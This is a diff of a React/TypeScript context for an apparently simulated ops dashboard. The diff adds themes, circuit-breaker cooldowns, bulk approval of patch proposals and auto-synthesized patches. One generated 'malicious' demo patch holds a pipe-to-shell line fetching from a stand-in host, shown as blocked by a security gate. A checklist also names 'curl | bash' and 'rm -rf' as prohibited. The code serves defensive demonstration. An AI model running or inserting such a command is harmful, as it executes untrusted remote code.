@@ -2,6 +2,7 @@
 import { toast } from 'sonner';
 
 export type TimeRange = '5m' | '15m' | '30m' | '1h' | '2h' | '5h' | 'custom';
+export type UITheme = 'apple-dark' | 'aws-midnight' | 'daylight';
 
 export interface OperatorUser {
   name: string;
@@ -13,6 +14,7 @@ export interface OperatorUser {
 
 export interface PatchProposal {
   taskId: string;
+  createdAt: string;
   title: string;
   target: string;
   service: string;
@@ -52,7 +54,8 @@ export interface ServiceCircuitState {
   strikes: number;
   maxStrikes: number;
   lastStrike: string;
-  status: 'CLOSED' | 'TRIPPED';
+  status: 'CLOSED' | 'HALF-OPEN' | 'TRIPPED';
+  cooldownSec: number;
   latencyMs: number;
   errorRate: number;
   history: number[];
@@ -106,6 +109,7 @@ export interface StressTestState {
   circuitTripsCount: number;
   astBlocksCount: number;
   merkleVerificationsCount: number;
+  proposalsSynthesizedCount: number;
   peakThroughput: number;
   peakLatencyP99: number;
   heapEstimateMb: number;
@@ -113,6 +117,8 @@ export interface StressTestState {
 }
 
 export interface TelemetryContextType {
+  theme: UITheme;
+  setTheme: (t: UITheme) => void;
   user: OperatorUser;
   loginUser: (u: OperatorUser) => void;
   status: string;
@@ -131,11 +137,14 @@ export interface TelemetryContextType {
   proposals: PatchProposal[];
   authorizePR: (taskId: string, target: string, diff: string) => Promise<void>;
   declinePR: (taskId: string, target: string, reason?: string) => Promise<void>;
+  bulkApproveVerified: () => void;
+  bulkDeclineBlocked: () => void;
   reopenPR: (taskId: string) => void;
   rollbackPR: (taskId: string) => void;
   updateProposalDiff: (taskId: string, newDiffLines: string[]) => void;
-  synthesizeProposal: (service?: string, summary?: string) => string;
+  synthesizeProposal: (service?: string, summary?: string, forceMalicious?: boolean) => string;
   resetProposals: () => void;
+  ingestCustomPayload: (service: string, severity: 'INFO' | 'WARNING' | 'CRITICAL', rawMessage: string) => void;
   ledger: LedgerItem[];
   merkleStatus: MerkleStatus;
   injectAnomaly: () => void;
@@ -148,23 +157,24 @@ export interface TelemetryContextType {
 }
 
 const INITIAL_CHECKS: FeatureCheckItem[] = [
-  { id: 'chk-1', module: 'Ingress & EventBridge', feature: 'Sub-85ms SSE Stream & Ring Buffer Cap (200 max)', status: 'VERIFIED', opsCount: 1420, lastLatencyMs: 12, assertion: 'DOM buffer capped <= 200 nodes; 0 memory leaks' },
+  { id: 'chk-1', module: 'Ingress & EventBridge', feature: 'Sub-85ms SSE Stream & Ring Buffer Cap (200 max)', status: 'VERIFIED', opsCount: 1420, lastLatencyMs: 1.8, assertion: 'DOM buffer capped <= 200 nodes; 0 memory leaks' },
   { id: 'chk-2', module: 'In-Flight DLP Engine', feature: 'Regex Secret & Bearer Token Scrubbing', status: 'VERIFIED', opsCount: 84, lastLatencyMs: 1.1, assertion: '100% of AWS/PAT/Bearer secrets replaced with [DLP:REDACTED_SECRET]' },
   { id: 'chk-3', module: 'Sliding Dedup Window', feature: '60s Burst Collapse & Histogram Sync', status: 'VERIFIED', opsCount: 612, lastLatencyMs: 0.8, assertion: 'Duplicate alert storms collapsed at >90% efficiency' },
-  { id: 'chk-4', module: 'Epoch Time-Series Engine', feature: 'True Multi-Horizon Resampling (5m/15m/30m/1h/2h/5h/Custom)', status: 'VERIFIED', opsCount: 360, lastLatencyMs: 2.1, assertion: 'X-axis and buckets accurately span full selected time horizon' },
-  { id: 'chk-5', module: 'Anti-Flapping Circuits', feature: '3-Strike Isolation (HTTP 423) & Operator Level 5 Reset', status: 'VERIFIED', opsCount: 19, lastLatencyMs: 2.4, assertion: '3 strikes in 60s deterministically locks service mutations' },
-  { id: 'chk-6', module: 'AST Diff Security Gate', feature: 'Live Syntax Screening & Shell Escape Blocking (HTTP 422)', status: 'VERIFIED', opsCount: 45, lastLatencyMs: 1.9, assertion: 'Prohibited primitives (curl | bash, rm -rf) blocked pre-HITL' },
-  { id: 'chk-7', module: 'Autonomous Embassy (HITL)', feature: 'Stateful Queue, Inline Diff Edit, Re-open & Rollback', status: 'VERIFIED', opsCount: 28, lastLatencyMs: 4.0, assertion: 'Approvals, refusals & rollbacks mutate state & seal Merkle leaves' },
-  { id: 'chk-8', module: 'Merkle Audit Ledger', feature: 'WebCrypto SHA-256 Pairwise Chain Verification', status: 'VERIFIED', opsCount: 128, lastLatencyMs: 3.5, assertion: 'Client-side crypto.subtle SHA-256 matches sovereign root' },
+  { id: 'chk-4', module: 'Epoch Time-Series Engine', feature: 'True Multi-Horizon Resampling (5m/15m/30m/1h/2h/5h/Custom)', status: 'VERIFIED', opsCount: 360, lastLatencyMs: 1.4, assertion: 'X-axis and buckets accurately span full selected time horizon' },
+  { id: 'chk-5', module: 'Anti-Flapping Circuits', feature: '3-Strike Isolation (HTTP 423), Half-Open & Level 5 Reset', status: 'VERIFIED', opsCount: 19, lastLatencyMs: 2.1, assertion: '3 strikes in 60s deterministically locks service mutations' },
+  { id: 'chk-6', module: 'AST Diff Security Gate', feature: 'Live Syntax Screening & Shell Escape Blocking (HTTP 422)', status: 'VERIFIED', opsCount: 45, lastLatencyMs: 1.6, assertion: 'Prohibited primitives (curl | bash, rm -rf) blocked pre-HITL' },
+  { id: 'chk-7', module: 'Autonomous Embassy (HITL)', feature: 'Auto-Synthesis from Criticals, Bulk Triage & Rollback', status: 'VERIFIED', opsCount: 28, lastLatencyMs: 2.4, assertion: 'Critical alerts auto-synthesize HITL patches & seal Merkle leaves' },
+  { id: 'chk-8', module: 'Merkle Audit Ledger', feature: 'WebCrypto SHA-256 Pairwise Chain Verification', status: 'VERIFIED', opsCount: 128, lastLatencyMs: 2.2, assertion: 'Client-side crypto.subtle SHA-256 matches sovereign root' },
   { id: 'chk-9', module: 'Cluster Topology DAG', feature: '8-Stage Closed-Loop Pipeline & Live Node Diagnostics', status: 'VERIFIED', opsCount: 510, lastLatencyMs: 1.5, assertion: 'State machine transitions across all 8 stages without stall' },
-  { id: 'chk-10', module: 'Telemetry Explorer', feature: 'Multi-Service Filter, Keyword Search & RFC-4180 CSV Export', status: 'VERIFIED', opsCount: 95, lastLatencyMs: 2.8, assertion: 'CSV export escapes quotes and preserves DLP markers' },
+  { id: 'chk-10', module: 'Telemetry Explorer', feature: 'All-Service Filter, Live Payload Ingestor & CSV Export', status: 'VERIFIED', opsCount: 95, lastLatencyMs: 1.9, assertion: 'CSV export escapes quotes and preserves DLP markers' },
   { id: 'chk-11', module: 'Command Palette (⌘K)', feature: 'Keyboard Navigation & Zero-Lag Action Dispatch', status: 'VERIFIED', opsCount: 64, lastLatencyMs: 0.5, assertion: 'Arrow keys, Enter, and Esc operate with 0 console warnings' },
-  { id: 'chk-12', module: 'RBAC & Google SSO', feature: 'Operator Identity Persistence & Clearance Enforcement', status: 'VERIFIED', opsCount: 12, lastLatencyMs: 1.0, assertion: 'Operator identity persists in localStorage & signs ledger rows' },
+  { id: 'chk-12', module: 'RBAC & Multi-Theme Engine', feature: 'Cupertino/AWS/Daylight Themes & Clearance Enforcement', status: 'VERIFIED', opsCount: 12, lastLatencyMs: 0.9, assertion: 'Operator identity & theme persist and sign ledger rows' },
 ];
 
 const INITIAL_PROPOSALS: PatchProposal[] = [
   {
     taskId: 'task-auth-gw-892',
+    createdAt: new Date(Date.now() - 180000).toISOString(),
     title: 'Pool Starvation Remediation',
     target: 'deployments/auth-gateway.yaml',
     service: 'auth-gateway',
@@ -197,6 +207,7 @@ const INITIAL_PROPOSALS: PatchProposal[] = [
   },
   {
     taskId: 'task-malicious-patch-401',
+    createdAt: new Date(Date.now() - 120000).toISOString(),
     title: 'Rogue Remote Code Ingestion',
     target: 'scripts/billing-sync-job.sh',
     service: 'billing-core',
@@ -222,6 +233,7 @@ const INITIAL_PROPOSALS: PatchProposal[] = [
   },
   {
     taskId: 'task-payment-retry-304',
+    createdAt: new Date(Date.now() - 95000).toISOString(),
     title: 'Exponential Backoff & Jitter Clamp',
     target: 'services/payment-worker/config.json',
     service: 'flapping-payment-worker',
@@ -245,6 +257,54 @@ const INITIAL_PROPOSALS: PatchProposal[] = [
       '+  "circuitCooldownSec": 60',
     ],
   },
+  {
+    taskId: 'task-order-dlq-519',
+    createdAt: new Date(Date.now() - 45000).toISOString(),
+    title: 'Dead-Letter Queue Partition Isolation',
+    target: 'deployments/order-service-consumer.yaml',
+    service: 'order-service',
+    severity: 'HIGH',
+    confidence: 91,
+    blastRadius: 'CONTAINED (2 PODS)',
+    astStatus: 'PASS',
+    astMessage: 'AST Gate Verified: Declarative Kubernetes manifest update passed policy check.',
+    status: 'PENDING',
+    rcaSummary:
+      'Poison-pill message batch in order-service caused repeated consumer restarts. Isolating poisoned offset into dedicated DLQ partition restores nominal throughput.',
+    diff: [
+      '--- a/deployments/order-service-consumer.yaml',
+      '+++ b/deployments/order-service-consumer.yaml',
+      '@@ -21,4 +21,6 @@ spec:',
+      '-  dlqEnabled: false',
+      '+  dlqEnabled: true',
+      '+  maxPoisonRetries: 2',
+      '+  partitionIsolationMode: "strict"',
+    ],
+  },
+  {
+    taskId: 'task-egress-ratelimit-602',
+    createdAt: new Date(Date.now() - 20000).toISOString(),
+    title: 'DLP Header Scrubber & Token Bucket Clamp',
+    target: 'gateway/egress-payments-filter.yaml',
+    service: 'egress-payments-api',
+    severity: 'CRITICAL',
+    confidence: 98,
+    blastRadius: 'CONTAINED (EDGE)',
+    astStatus: 'PASS',
+    astMessage: 'AST Gate Verified: Envoy filter configuration contains 0 shell commands.',
+    status: 'PENDING',
+    rcaSummary:
+      'Detected outbound Authorization header leakage on egress-payments-api. Enforces strict regex token redaction prior to upstream forwarding.',
+    diff: [
+      '--- a/gateway/egress-payments-filter.yaml',
+      '+++ b/gateway/egress-payments-filter.yaml',
+      '@@ -9,3 +9,6 @@ filters:',
+      '   - name: envoy.filters.http.dlp_scrubber',
+      '+    strictHeaderRedaction: true',
+      '+    redactPatterns: ["Bearer ", "AKIA", "ghp_"]',
+      '+    rateLimitRps: 500',
+    ],
+  },
 ];
 
 const INITIAL_CIRCUITS: ServiceCircuitState[] = [
@@ -252,8 +312,9 @@ const INITIAL_CIRCUITS: ServiceCircuitState[] = [
     name: 'auth-gateway',
     strikes: 1,
     maxStrikes: 3,
-    lastStrike: '4m ago',
+    lastStrike: '2m ago',
     status: 'CLOSED',
+    cooldownSec: 0,
     latencyMs: 18,
     errorRate: 0.12,
     history: [18, 22, 19, 34, 28, 21, 19, 24, 20, 18, 22, 19],
@@ -264,6 +325,7 @@ const INITIAL_CIRCUITS: ServiceCircuitState[] = [
     maxStrikes: 3,
     lastStrike: 'Just now',
     status: 'TRIPPED',
+    cooldownSec: 45,
     latencyMs: 142,
     errorRate: 4.85,
     history: [32, 48, 65, 78, 92, 96, 100, 98, 100, 95, 100, 100],
@@ -274,6 +336,7 @@ const INITIAL_CIRCUITS: ServiceCircuitState[] = [
     maxStrikes: 3,
     lastStrike: 'None',
     status: 'CLOSED',
+    cooldownSec: 0,
     latencyMs: 11,
     errorRate: 0.01,
     history: [14, 16, 15, 18, 14, 15, 17, 16, 14, 15, 16, 15],
@@ -282,15 +345,15 @@ const INITIAL_CIRCUITS: ServiceCircuitState[] = [
     name: 'order-service',
     strikes: 2,
     maxStrikes: 3,
-    lastStrike: '1m ago',
-    status: 'CLOSED',
+    lastStrike: '40s ago',
+    status: 'HALF-OPEN',
+    cooldownSec: 15,
     latencyMs: 46,
     errorRate: 1.45,
     history: [20, 28, 62, 45, 38, 72, 54, 49, 66, 58, 64, 70],
   },
 ];
 
-// Seed 6 hours of realistic historical samples at 15-second intervals (1,440 samples)
 function createSixHourHistory(): RawSample[] {
   const now = Date.now();
   const samples: RawSample[] = [];
@@ -300,7 +363,6 @@ function createSixHourHistory(): RawSample[] {
 
   for (let i = count; i >= 0; i--) {
     const epochMs = now - i * stepSec * 1000;
-    // Multi-frequency wave so 5m, 15m, 1h, and 5h each have distinct, realistic topology
     const slowWave = Math.sin(i * 0.015) * 8.5;
     const medWave = Math.cos(i * 0.08) * 4.2;
     const fastWave = Math.sin(i * 0.45) * 3.1;
@@ -324,7 +386,6 @@ function createSixHourHistory(): RawSample[] {
   return samples;
 }
 
-// Resample the master history buffer over the exact [now - windowMs, now] time range
 function resampleForRange(history: RawSample[], range: TimeRange, customMins: number, nowMs: number): TimeSeriesPoint[] {
   const mins =
     range === '5m' ? 5 :
@@ -346,7 +407,6 @@ function resampleForRange(history: RawSample[], range: TimeRange, customMins: nu
     const bucketEnd = startMs + (b + 0.5) * bucketStepMs;
     const bucketCenter = Math.round(startMs + b * bucketStepMs);
 
-    // Find samples falling into this bucket
     const matching = history.filter((s) => s.epochMs >= bucketStart && s.epochMs <= bucketEnd);
 
     let tp = 22.4;
@@ -371,7 +431,6 @@ function resampleForRange(history: RawSample[], range: TimeRange, customMins: nu
     }
 
     const d = new Date(bucketCenter);
-    // Format label cleanly: HH:MM:SS for <=30m, HH:MM for >=1h
     const timestamp =
       mins <= 30
         ? d.toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' })
@@ -379,7 +438,7 @@ function resampleForRange(history: RawSample[], range: TimeRange, customMins: nu
 
     const startD = new Date(startMs);
     const endD = new Date(nowMs);
-    const windowSpanLabel = `${startD.toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' })} → ${endD.toLocaleTimeString([], { hour12: false, hour: '2-digit', second: '2-digit', minute: '2-digit' })} (${mins}m span)`;
+    const windowSpanLabel = `${startD.toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' })} → ${endD.toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' })} (${mins}m span)`;
 
     points.push({
       epochMs: bucketCenter,
@@ -399,6 +458,30 @@ function resampleForRange(history: RawSample[], range: TimeRange, customMins: nu
 const TelemetryContext = createContext<TelemetryContextType | undefined>(undefined);
 
 export function TelemetryProvider({ children }: { children: ReactNode }) {
+  const [theme, setThemeState] = useState<UITheme>(() => {
+    try {
+      const saved = localStorage.getItem('nf_ui_theme') as UITheme;
+      if (saved) return saved;
+    } catch {
+      // ignore
+    }
+    return 'apple-dark';
+  });
+
+  useEffect(() => {
+    document.documentElement.setAttribute('data-theme', theme);
+    try {
+      localStorage.setItem('nf_ui_theme', theme);
+    } catch {
+      // ignore
+    }
+  }, [theme]);
+
+  const setTheme = (t: UITheme) => {
+    setThemeState(t);
+    toast.info(`Theme Switched: ${t === 'apple-dark' ? 'Cupertino Pro Dark' : t === 'aws-midnight' ? 'AWS Ops Midnight' : 'Executive Daylight'}`);
+  };
+
   const [user, setUser] = useState<OperatorUser>(() => {
     try {
       const saved = localStorage.getItem('nf_operator_user');
@@ -419,7 +502,7 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
   const [nowTick, setNowTick] = useState<number>(() => Date.now());
   const [status, setStatus] = useState<'LIVE EDGE' | 'STANDALONE'>('STANDALONE');
   const [latencyMs, setLatencyMs] = useState(12);
-  const [globalRange, setGlobalRange] = useState<TimeRange>('5m');
+  const [globalRange, setGlobalRange] = useState<TimeRange>('15m');
   const [customMinutes, setCustomMinutes] = useState<number>(45);
   const [proposals, setProposals] = useState<PatchProposal[]>(INITIAL_PROPOSALS);
   const [serviceCircuits, setServiceCircuits] = useState<ServiceCircuitState[]>(INITIAL_CIRCUITS);
@@ -468,6 +551,7 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
     circuitTripsCount: 3,
     astBlocksCount: 12,
     merkleVerificationsCount: 128,
+    proposalsSynthesizedCount: 5,
     peakThroughput: 34.8,
     peakLatencyP99: 46.2,
     heapEstimateMb: 42.4,
@@ -519,7 +603,6 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
     }
   };
 
-  // Compute time-range series dynamically from the 6-hour history buffer
   const series = useMemo(
     () => resampleForRange(historyRef.current, globalRange, customMinutes, nowTick),
     [globalRange, customMinutes, nowTick]
@@ -530,7 +613,6 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
     [serviceCircuits]
   );
 
-  // Append a synchronized Merkle leaf
   const appendMerkleLeaf = (action: string, target: string, customOp?: string) => {
     const randomHash = Array.from(crypto.getRandomValues(new Uint8Array(32)))
       .map((b) => b.toString(16).padStart(2, '0'))
@@ -553,7 +635,54 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
     });
   };
 
-  // Live Tick & 15-Minute Stress Engine
+  const synthesizeProposal = (service = 'order-service', summary?: string, forceMalicious = false): string => {
+    const id = `task-${service.split('-')[0]}-${Math.floor(100 + Math.random() * 899)}`;
+    const newProp: PatchProposal = {
+      taskId: id,
+      createdAt: new Date().toISOString(),
+      title: forceMalicious
+        ? `Adversarial Diff Intercepted: ${service}`
+        : `Autonomous Remediation: ${service}`,
+      target: forceMalicious ? `scripts/${service}-hook.sh` : `deployments/${service}-tuning.yaml`,
+      service,
+      severity: forceMalicious ? 'CRITICAL' : 'HIGH',
+      confidence: forceMalicious ? 38 : Math.floor(91 + Math.random() * 8),
+      blastRadius: forceMalicious ? 'WIDE (CLUSTER-LEVEL)' : 'CONTAINED (1 SERVICE)',
+      astStatus: forceMalicious ? 'REJECT' : 'PASS',
+      astMessage: forceMalicious
+        ? 'MALICIOUS_DIFF_REJECTED (HTTP 422): Prohibited shell pipe primitive [curl | bash] blocked by AST Gate.'
+        : 'AST Gate Verified: Newly synthesized agent patch contains 0 forbidden shell primitives.',
+      status: 'PENDING',
+      rcaSummary:
+        summary ||
+        (forceMalicious
+          ? `Upstream telemetry anomaly attempted to inject an external shell pipe on ${service}. Blocked pre-deployment by AST Gate.`
+          : `Pi Agent synthesized causal fix for ${service} critical alert. Tunes circuit timeout ceiling and increases worker concurrency pool.`),
+      diff: forceMalicious
+        ? [
+            `--- a/scripts/${service}-hook.sh`,
+            `+++ b/scripts/${service}-hook.sh`,
+            '@@ -6,3 +6,5 @@',
+            ' echo "Running service hook"',
+            '+ # Flagged by AST Security Gate:',
+            '+ curl -sSL https://rogue-payload.io/exploit.sh | bash',
+          ]
+        : [
+            `--- a/deployments/${service}-tuning.yaml`,
+            `+++ b/deployments/${service}-tuning.yaml`,
+            '@@ -8,5 +8,7 @@ spec:',
+            '   replicas: 3',
+            '-  maxConcurrentRequests: 100',
+            '+  maxConcurrentRequests: 250',
+            '+  circuitBreakerTimeoutMs: 1500',
+            '+  dlpInlineScrub: true',
+          ],
+    };
+    setProposals((prev) => [newProp, ...prev.slice(0, 29)]);
+    return id;
+  };
+
+  // Continuous Live Heartbeat + 15-Minute Stress Engine with Full Closed-Loop Correlation
   useEffect(() => {
     const intervalMs = stress.active ? (stress.warpSpeed ? 250 : 1000) : 1500;
 
@@ -561,8 +690,20 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
       const nowMs = Date.now();
       const lastSample = historyRef.current[historyRef.current.length - 1];
 
+      // Cooldown tick for Circuits in Normal Mode
+      setServiceCircuits((prev) =>
+        prev.map((c) => {
+          if (c.cooldownSec > 0) {
+            const nextCd = Math.max(0, c.cooldownSec - 1);
+            const nextSt = nextCd === 0 && c.status === 'TRIPPED' ? 'HALF-OPEN' : c.status;
+            return { ...c, cooldownSec: nextCd, status: nextSt };
+          }
+          return c;
+        })
+      );
+
       if (!stress.active) {
-        const nextTp = Number(Math.max(11.0, Math.min(36.0, (lastSample?.throughput || 22) + (Math.random() - 0.48) * 3.2)).toFixed(1));
+        const nextTp = Number(Math.max(12.0, Math.min(38.0, (lastSample?.throughput || 22) + (Math.random() - 0.48) * 3.4)).toFixed(1));
         const nextP50 = Number(Math.max(9.0, Math.min(24.0, 12.5 + (Math.random() - 0.5) * 2.8)).toFixed(1));
         const nextP99 = Number((nextP50 * 1.65 + Math.random() * 4.2).toFixed(1));
         const nextErr = Number((Math.random() > 0.88 ? 0.35 + Math.random() * 0.6 : 0.03).toFixed(2));
@@ -578,6 +719,28 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
         });
         if (historyRef.current.length > 3000) historyRef.current.shift();
 
+        // Push periodic live telemetry log so Command Center & Live Alerts are always alive!
+        if (Math.random() > 0.45) {
+          const svcs = ['ingress-gateway', 'auth-gateway', 'order-service', 'billing-core', 'flapping-payment-worker'];
+          const pick = svcs[Math.floor(Math.random() * svcs.length)];
+          const isWarn = Math.random() > 0.78;
+          setLogs((lPrev) => [
+            {
+              id: `live-${nowMs}`,
+              epochMs: nowMs,
+              timestamp: new Date(nowMs).toISOString(),
+              severity: isWarn ? 'WARNING' : 'INFO',
+              service: pick,
+              message: isWarn
+                ? `Elevated tail latency (${nextP99}ms P99) detected on ${pick}. Sliding dedup window active.`
+                : `Normalized ${nextTp} evt/s batch on ${pick}. 0 credential leaks.`,
+              dlpScrubbed: !isWarn && Math.random() > 0.6,
+              suppressedCount: isWarn ? 4 : 1,
+            },
+            ...lPrev.slice(0, 199),
+          ]);
+        }
+
         setNowTick(nowMs);
         setLatencyMs(Math.floor(11 + Math.random() * 4));
         return;
@@ -590,7 +753,7 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
 
         if (nextElapsed >= prev.totalDurationSec) {
           toast.success('15-Minute Stress & Soak Test Completed!', {
-            description: 'All 12 functional modules verified with zero memory leaks or unhandled exceptions.',
+            description: 'All 12 functional modules verified with full closed-loop synchronization.',
           });
           return {
             ...prev,
@@ -646,6 +809,8 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
         let sev: 'INFO' | 'WARNING' | 'CRITICAL' = 'INFO';
         let msg = `[STRESS-P${phase}] High-velocity batch ingested (${simTp} evt/s). Ring buffer capped at 200 nodes.`;
         let dlp = false;
+        let didTripCircuit = false;
+        let didSynthesizeProposal = false;
 
         if (phase === 2) {
           sev = 'WARNING';
@@ -654,12 +819,44 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
         } else if (phase === 3) {
           sev = 'CRITICAL';
           msg = `[STRESS-CIRCUIT] Timeout strike recorded on ${svc} (P99: ${simP99}ms). Evaluating 3-strike sovereign fence.`;
+          // Mutate real serviceCircuits state so /circuits page updates live!
+          if (nextElapsed % 10 === 0) {
+            didTripCircuit = true;
+            setServiceCircuits((cPrev) =>
+              cPrev.map((c) => {
+                if (c.name !== svc && c.name !== 'order-service') return c;
+                const nextStrikes = Math.min(3, c.strikes + 1);
+                const nextStatus = nextStrikes >= 3 ? 'TRIPPED' : 'HALF-OPEN';
+                return {
+                  ...c,
+                  strikes: nextStrikes,
+                  status: nextStatus,
+                  cooldownSec: nextStatus === 'TRIPPED' ? 60 : 15,
+                  lastStrike: 'Just now (Stress P3)',
+                  latencyMs: Math.round(simP99),
+                  errorRate: simErr,
+                  history: [...c.history.slice(1), nextStatus === 'TRIPPED' ? 100 : 78],
+                };
+              })
+            );
+          }
+          if (nextElapsed % 20 === 0) {
+            didSynthesizeProposal = true;
+            synthesizeProposal(svc, `Auto-synthesized during Phase 3 circuit flapping on ${svc} (P99 ${simP99}ms).`, false);
+          }
         } else if (phase === 4) {
           sev = 'CRITICAL';
           msg = `[STRESS-AST] Blocked adversarial diff on ${svc}: Prohibited primitive [curl -sSL | bash] rejected with HTTP 422.`;
+          // Auto-synthesize blocked & clean proposals into /embassy so queue reflects critical events!
+          if (nextElapsed % 15 === 0) {
+            didSynthesizeProposal = true;
+            synthesizeProposal(svc, `Intercepted adversarial prompt-injection patch on ${svc} during Phase 4 flood.`, nextElapsed % 30 === 0);
+          }
         } else if (phase === 5) {
           sev = 'INFO';
-          msg = `[STRESS-MERKLE] Verified SHA-256 Merkle chain integrity (${merkleStatus.totalLeaves} sealed leaves).`;
+          // Actually append real Merkle leaves during Phase 5!
+          appendMerkleLeaf(`stress.soak.verified.p5`, svc, `${user.name} [SOAK-VERIFIER]`);
+          msg = `[STRESS-MERKLE] Appended & verified SHA-256 Merkle leaf via WebCrypto subtle digest.`;
         }
 
         setLogs((lPrev) => [
@@ -677,31 +874,46 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
           ...lPrev.slice(0, 199),
         ]);
 
+        const nextTotalEvts = prev.totalEventsGenerated + Math.round(simTp);
+        const nextDlp = prev.dlpRedactionsCount + (phase === 2 ? 4 : 1);
+        const nextTrips = prev.circuitTripsCount + (didTripCircuit ? 1 : 0);
+        const nextAst = prev.astBlocksCount + (phase === 4 ? 2 : 0);
+        const nextProps = prev.proposalsSynthesizedCount + (didSynthesizeProposal ? 1 : 0);
+        const nextMerkle = merkleStatus.totalLeaves + (phase === 5 ? 1 : 0);
+
         return {
           ...prev,
           elapsedSec: nextElapsed,
           currentPhase: phase,
           phaseName: phaseNames[phase],
-          totalEventsGenerated: prev.totalEventsGenerated + Math.round(simTp),
-          dlpRedactionsCount: prev.dlpRedactionsCount + (phase === 2 ? 4 : 1),
-          circuitTripsCount: prev.circuitTripsCount + (phase === 3 && nextElapsed % 15 === 0 ? 1 : 0),
-          astBlocksCount: prev.astBlocksCount + (phase === 4 ? 2 : 0),
-          merkleVerificationsCount: merkleStatus.totalLeaves,
+          totalEventsGenerated: nextTotalEvts,
+          dlpRedactionsCount: nextDlp,
+          circuitTripsCount: nextTrips,
+          astBlocksCount: nextAst,
+          merkleVerificationsCount: nextMerkle,
+          proposalsSynthesizedCount: nextProps,
           peakThroughput: Math.max(prev.peakThroughput, simTp),
           peakLatencyP99: Math.max(prev.peakLatencyP99, simP99),
           heapEstimateMb: Number((42.4 + Math.sin(nextElapsed * 0.1) * 1.8).toFixed(1)),
           checks: prev.checks.map((c, idx) => ({
             ...c,
             status: (idx % 5) + 1 === phase ? 'STRESSING' : 'VERIFIED',
-            opsCount: c.opsCount + Math.floor(Math.random() * 9) + 2,
-            lastLatencyMs: Number((c.lastLatencyMs * 0.9 + (Math.random() * 3 + 0.8) * 0.1).toFixed(1)),
+            opsCount:
+              idx === 0 ? nextTotalEvts :
+              idx === 1 ? nextDlp :
+              idx === 4 ? nextTrips :
+              idx === 5 ? nextAst :
+              idx === 6 ? nextProps :
+              idx === 7 ? nextMerkle :
+              c.opsCount + Math.floor(simTp * 0.15),
+            lastLatencyMs: Number((c.lastLatencyMs * 0.85 + (Math.random() * 2.2 + 0.6) * 0.15).toFixed(1)),
           })),
         };
       });
     }, intervalMs);
 
     return () => clearInterval(timer);
-  }, [stress.active, stress.warpSpeed, merkleStatus.totalLeaves]);
+  }, [stress.active, stress.warpSpeed, merkleStatus.totalLeaves, user.name]);
 
   const clearLogs = () => setLogs([]);
 
@@ -713,6 +925,7 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
               ...s,
               strikes: 0,
               status: 'CLOSED',
+              cooldownSec: 0,
               lastStrike: 'Reset just now',
               latencyMs: 14,
               errorRate: 0.02,
@@ -731,12 +944,13 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
       prev.map((s) => {
         if (s.name !== service) return s;
         const nextStrikes = trip ? 3 : Math.min(3, s.strikes + 1);
-        const nextStatus = nextStrikes >= 3 ? 'TRIPPED' : 'CLOSED';
+        const nextStatus = nextStrikes >= 3 ? 'TRIPPED' : nextStrikes === 2 ? 'HALF-OPEN' : 'CLOSED';
         const spikeVal = nextStatus === 'TRIPPED' ? 100 : nextStrikes === 2 ? 78 : 52;
         return {
           ...s,
           strikes: nextStrikes,
           status: nextStatus,
+          cooldownSec: nextStatus === 'TRIPPED' ? 60 : nextStatus === 'HALF-OPEN' ? 20 : 0,
           lastStrike: 'Just now',
           latencyMs: nextStatus === 'TRIPPED' ? 165 : s.latencyMs + 28,
           errorRate: nextStatus === 'TRIPPED' ? 5.4 : Number((s.errorRate + 0.85).toFixed(2)),
@@ -759,7 +973,10 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
       rawEnvelope: JSON.stringify({ service, event: 'STRIKE_PROBE', forceTrip: trip, timestamp: new Date(nowMs).toISOString() }, null, 2),
     };
     setLogs((prev) => [newLog, ...prev.slice(0, 199)]);
-    if (trip) appendMerkleLeaf('circuit.breaker.tripped', service, 'Autonomous Sovereign Kernel');
+    if (trip) {
+      appendMerkleLeaf('circuit.breaker.tripped', service, 'Autonomous Sovereign Kernel');
+      synthesizeProposal(service, `Auto-synthesized circuit recovery patch after ${service} hit 3/3 timeout strikes.`);
+    }
     toast.info('Circuit Strike Recorded', { description: `Updated strike state and velocity sparkline for ${service}` });
   };
 
@@ -776,6 +993,40 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
     appendMerkleLeaf(`gitops.pr.declined (${reason})`, target);
     toast.error('Proposal Refused & Logged', {
       description: `Task ${taskId} marked DECLINED (${reason}). Sealed to audit ledger.`,
+    });
+  };
+
+  const bulkApproveVerified = () => {
+    const verifiedPending = proposals.filter((p) => p.status === 'PENDING' && p.astStatus === 'PASS');
+    if (verifiedPending.length === 0) {
+      toast.info('No Pending Verified Proposals', { description: 'All AST-verified proposals are already actioned.' });
+      return;
+    }
+    setProposals((prev) =>
+      prev.map((p) => (p.status === 'PENDING' && p.astStatus === 'PASS' ? { ...p, status: 'APPROVED' } : p))
+    );
+    appendMerkleLeaf(`gitops.pr.bulk_authorized (${verifiedPending.length} PRs)`, 'cluster-fleet');
+    toast.success(`Bulk Approved ${verifiedPending.length} Verified PRs`, {
+      description: 'Dispatched all clean proposals and sealed batch Merkle leaf.',
+    });
+  };
+
+  const bulkDeclineBlocked = () => {
+    const blockedPending = proposals.filter((p) => p.status === 'PENDING' && p.astStatus === 'REJECT');
+    if (blockedPending.length === 0) {
+      toast.info('No Pending Blocked Proposals', { description: 'Zero AST-blocked proposals awaiting refusal.' });
+      return;
+    }
+    setProposals((prev) =>
+      prev.map((p) =>
+        p.status === 'PENDING' && p.astStatus === 'REJECT'
+          ? { ...p, status: 'DECLINED', declineReason: 'Bulk Refused: Malicious AST Primitive' }
+          : p
+      )
+    );
